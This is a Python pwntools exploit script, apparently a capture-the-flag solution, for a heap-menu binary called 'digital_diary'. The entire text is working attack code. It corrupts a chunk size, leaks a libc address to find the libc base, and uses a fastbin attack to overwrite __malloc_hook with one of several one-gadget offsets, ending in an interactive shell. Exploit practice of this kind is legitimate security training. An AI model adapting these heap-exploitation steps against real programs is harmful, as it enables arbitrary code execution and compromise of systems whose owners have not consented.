from pwn import *
libc=ELF('./digital_diary').libc
gadgets=[0x45216,0x4526a,0xcd0f3,0xcd1c8,0xf02a4,0xf02b0,0xf1147,0xf66f0]
for gadget in gadgets:
	target=process('./digital_diary')
	def init(option):
		print(target.recvuntil("exit\n"))
		target.sendline(str(option))

	def addsec():
		init(1)

	def usesec():
		init(2)

	def freesec():
		init(3)

	def savemem(index,size,data):
		init(4)
		print(target.recvline())
		target.sendline(str(index))
		print(target.recvline())
		target.sendline(str(size))
		print(target.recvline())
		target.send(data)

	def viewmem(index):
		init(5)
		print(target.recvline())
		target.sendline(str(index))
		print(target.recvuntil(": "))
		leak=target.recvline().strip("\n")
		return leak

	def freemem(index):
		init(6)
		print(target.recvline())
		target.sendline(str(index))

	addsec()
	savemem(0,0x80,"A\n")
	savemem(1,0x30,"A"*0x28+p64(0x1fb01))
	savemem(2,0x60,"A\n")
	savemem(3,0x70,"A\n")
	freemem(0)
	savemem(0,8,"A"*8)
	libc_leak=u64(viewmem(0)[8:14].ljust(8,"\x00"))
	libc_base=libc_leak-0x3c4b78-0x80
	libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
	libc_gadget=libc_base+gadget
	print(hex(libc_base))
	freesec()
	freemem(2)
	savemem(2,0x10,p64(0xdeadbeef)+p64(libc_base+0x3c4b79))
	usesec()
	pause()
	savemem(4,0x80,p64(0)+p64(0x71)+p64(libc_malloc_hook-0x23))
	savemem(5,0x60,"A\n")
	savemem(6,0x60,"A"*0x13+p64(libc_gadget))


	init(4)
	print(target.recvline())
	target.sendline(str(7))
	print(target.recvline())
	target.sendline(str(1))

	target.interactive()	
		
	
